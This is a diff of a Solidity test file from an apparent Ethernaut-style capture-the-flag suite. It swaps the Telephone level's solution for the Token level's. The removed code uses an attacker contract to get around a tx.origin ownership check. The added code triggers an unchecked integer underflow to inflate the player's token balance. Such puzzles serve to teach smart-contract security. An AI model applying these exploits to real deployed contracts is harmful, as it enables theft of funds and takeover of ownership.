@@ -3,15 +3,15 @@ pragma solidity >=0.6.0;
 pragma experimental ABIEncoderV2;
 
 import "./utils/BaseTest.sol";
-import "src/levels/Telephone.sol";
-import "src/levels/TelephoneFactory.sol";
+import "src/levels/Token.sol";
+import "src/levels/TokenFactory.sol";
 
-contract TestTelephone is BaseTest {
-    Telephone private level;
+contract TestToken is BaseTest {
+    Token private level;
 
     constructor() public {
         // SETUP LEVEL FACTORY
-        levelFactory = new TelephoneFactory();
+        levelFactory = new TokenFactory();
     }
 
     function setUp() public override {
@@ -27,7 +27,10 @@ contract TestTelephone is BaseTest {
         /** CODE YOUR SETUP HERE */
 
         levelAddress = payable(this.createLevelInstance(true));
-        level = Telephone(levelAddress);
+        level = Token(levelAddress);
+
+        // Check that the contract is correctly setup
+        assertEq(level.balanceOf(player), 20);
     }
 
     function exploitLevel() internal override {
@@ -35,18 +38,13 @@ contract TestTelephone is BaseTest {
 
         vm.startPrank(player);
 
-        // Can't call changeOwner fn directly from an EOA cause of tx.origin == msg.sender Check
-        // Therefore, deploying an attacker contract and calling changeOwner fn from that contract
-        Attacker attacker = new Attacker();
-        attacker.attack(level);
-        assertEq(level.owner(), player);
+        // We start with a balance of 20 tokens. Token contract uses 0.6 compiler and does not check
+        // for arithmetic over/under flow. If we transfer more than 20 tokens, our balance will underflow
+        // we will end up with a balance way more than 20.
+        level.transfer(vm.addr(1), 21);
+
+        assertEq(level.balanceOf(player), 2**256 - 1);
 
         vm.stopPrank();
-    }
-}
-
-contract Attacker {
-    function attack(Telephone _level) public {
-        _level.changeOwner(msg.sender);
     }
 }
